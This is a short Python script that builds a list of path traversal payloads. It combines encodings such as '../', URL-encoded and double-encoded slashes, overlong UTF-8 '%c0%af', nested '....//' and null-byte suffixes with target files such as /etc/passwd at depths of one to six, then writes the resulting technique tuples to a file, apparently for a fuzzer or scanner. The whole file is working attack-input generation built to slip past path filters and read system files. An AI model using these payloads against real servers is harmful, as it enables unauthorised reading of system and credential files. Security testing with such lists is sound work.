
TRAVERSALS = [
    ("../", "Simple traversal"),
    ("..%2f", "URL-encoded slash"),
    ("..%5c", "URL-encoded backslash"),
    ("..%c0%af", "Non-standard encoding 1"),
    ("..%ef%bc%8f", "Non-standard encoding 2"),
    ("....//", "Nested traversal"),
    (r"..\\/", "Nested traversal with backslash"),
]

with open("all_payloads.txt", "r") as f:
    TARGET_FILES = [line.strip() for line in f if line.strip()]

TECHNIQUES = []
technique_id = 1

# Add original techniques
TECHNIQUES.extend([
    ("T01", "Absolute path",                   "/etc/passwd"),
    ("T02", "Simple traversal ../ x6",         "../"*6 + "etc/passwd"),
    ("T03", "Nested traversal ....// x3",      "....//"*3 + "etc/passwd"),
    ("T04", r"Nested traversal ....\\/ x3",     r"....\\/"*3 + "etc/passwd"),
    ("T05", "Single URL-encoded ../ x3",       "%2e%2e%2f"*3 + "etc/passwd"),
    ("T06", "Double URL-encoded ../ x3",       "%252e%252e%252f"*3 + "etc/passwd"),
    ("T07", "Non-standard ..%c0%af x3",        "..%c0%af"*3 + "etc/passwd"),
    ("T08", "Non-standard ..%ef%bc%8f x3",     "..%ef%bc%8f"*3 + "etc/passwd"),
    ("T09", "Base-dir bypass /var/www/images", "/var/www/images/../../../etc/passwd"),
    ("T10", "Null byte terminator png",        "../../../etc/passwd%00.png"),
])
technique_id = 11

for traversal, trav_desc in TRAVERSALS:
    for target in TARGET_FILES:
        for i in range(1, 7):
            payload = traversal * i + target
            desc = f"{trav_desc} x{i} + {target}"
            TECHNIQUES.append((f"T{technique_id:02d}", desc, payload))
            technique_id += 1

with open("new_techniques.txt", "w") as f:
    for tid, desc, payload in TECHNIQUES:
        # Escape backslashes for the lambda function string representation
        escaped_payload = payload.replace("\\", "\\\\")
        f.write(f'    ("{tid}", "{desc}", "{escaped_payload}"),\n')


